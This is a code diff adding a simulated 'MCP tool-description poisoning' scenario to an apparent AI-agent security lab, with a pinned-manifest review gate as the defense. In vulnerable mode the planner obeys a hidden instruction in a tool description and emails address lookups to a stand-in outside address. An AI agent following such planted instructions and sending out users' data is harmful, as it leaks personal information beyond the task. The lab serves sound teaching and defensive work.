@@ -27,6 +27,11 @@ SECURE_DEFENSES = {
         "Session principal (customer_id) is bound at the executor, never taken from the model",
         "Planner asking for 'all customers' cannot widen the user's scope",
     ],
+    "mcp_tool_poisoning": [
+        "Registry pins each reviewed tool manifest by SHA-256, description included",
+        "A changed or new description is held for review and never reaches the planner",
+        "Egress allow-list on send_email stays on as the backstop",
+    ],
 }
 
 
@@ -322,6 +327,115 @@ def sim_agent_identity() -> dict[str, Any]:
     }
 
 
+def sim_mcp_tool_poisoning() -> dict[str, Any]:
+    """Scenario 19: a registry tool whose description carries instructions.
+
+    Vulnerable: the updated ward_lookup manifest is loaded straight into the
+    planner's context, the planner follows the sentence in its description, and
+    the executor sends the last lookups to an outside address through the real
+    email tool (captured by MailHog). Secure: the registry's pinned-hash gate
+    holds the changed manifest for review, so the planner never reads it.
+    """
+    from defenses.m07.manifest_pin import POISONED_WARD_LOOKUP, manifest_hash, review_gate
+    from lab.simulate import EMAIL_TOOL_URL, _invoke
+
+    secure = is_secure()
+    manifest = POISONED_WARD_LOOKUP
+    to = "wardsync@ward-data.example"
+    lookups = [
+        "14 Lake Road", "2 Station Lane", "88 Mill Street", "5 Temple Square", "31 Canal View",
+    ]
+    events.emit(
+        "retrieve",
+        f"Registry update: ward_lookup v{manifest['version']} (hash {manifest_hash(manifest)[:12]}). "
+        f"Description: \"{manifest['description']}\"",
+        actor="registry",
+        secure_mode=secure,
+    )
+
+    if secure:
+        admit, reason = review_gate(manifest)
+        events.emit("defense", f"MANIFEST PIN: {reason}", actor="registry", outcome="blocked", secure_mode=True)
+        events.emit(
+            "explain",
+            "The planner's tool list still holds the reviewed v1.4.1 description. Ward lookup keeps "
+            "working; the new sentence never becomes an instruction.",
+            actor="lab",
+            outcome="info",
+        )
+        return {
+            "attack_id": "mcp_tool_poisoning",
+            "name": "MCP tool-description poisoning (ASI04 / LLM04)",
+            "layer": "B",
+            "secure_mode": True,
+            "success": False,
+            "blocked": not admit,
+            "detail": f"Registry refused the changed manifest: {reason}",
+            "evidence": {
+                "manifest_version": manifest["version"],
+                "manifest_admitted": admit,
+                "hidden_instruction_followed": False,
+                "email_sent": False,
+                "defenses_active_when_secure": SECURE_DEFENSES["mcp_tool_poisoning"],
+            },
+        }
+
+    events.emit(
+        "plan",
+        "Planner context now includes the new description. Plan: ward_lookup(address), then "
+        f"send_email(to={to}, body=last 20 lookups), then answer.",
+        actor="planner",
+        outcome="success",
+        secure_mode=False,
+    )
+    events.emit(
+        "explain",
+        "Nothing here is a jailbreak. The tool's own documentation told the planner to send the "
+        "data, and the planner reads tool descriptions as instructions.",
+        actor="lab",
+        outcome="info",
+    )
+    sent = False
+    error = None
+    try:
+        data = _invoke(EMAIL_TOOL_URL, {
+            "to": to,
+            "subject": "ward cache sync",
+            "body": "\n".join(lookups),
+        })
+        body = data.get("result") or {}
+        error = body.get("error")
+        sent = bool(body.get("sent")) and not error
+    except Exception as exc:  # noqa: BLE001
+        error = str(exc)
+    events.emit(
+        "tool",
+        (f"send_email → {to}: SENT ({len(lookups)} addresses; captured by MailHog, not the internet)"
+         if sent else f"send_email → {to}: not sent ({error})"),
+        actor="email_tool",
+        outcome="success" if sent else "info",
+        secure_mode=False,
+    )
+    return {
+        "attack_id": "mcp_tool_poisoning",
+        "name": "MCP tool-description poisoning (ASI04 / LLM04)",
+        "layer": "B",
+        "secure_mode": False,
+        "success": sent,
+        "blocked": False,
+        "detail": (f"Hidden instruction followed: {len(lookups)} citizen lookups emailed to {to}"
+                   if sent else f"Email tool did not send: {error}"),
+        "evidence": {
+            "manifest_version": manifest["version"],
+            "manifest_admitted": True,
+            "hidden_instruction_followed": True,
+            "email_sent": sent,
+            "recipient": to,
+            "defenses_active_when_secure": SECURE_DEFENSES["mcp_tool_poisoning"],
+        },
+    }
+
+
 RUNNERS: dict[str, Callable[[], dict[str, Any]]] = {}
 for _lid, _fn in [
     ("direct_pi", sim_direct_pi),
@@ -330,5 +444,7 @@ for _lid, _fn in [
     ("a5_dlp", sim_data_guards),
     ("agent_identity", sim_agent_identity),
     ("a6_identity", sim_agent_identity),
+    ("mcp_tool_poisoning", sim_mcp_tool_poisoning),
+    ("m7b_tool_poisoning", sim_mcp_tool_poisoning),
 ]:
     RUNNERS[_lid] = _fn
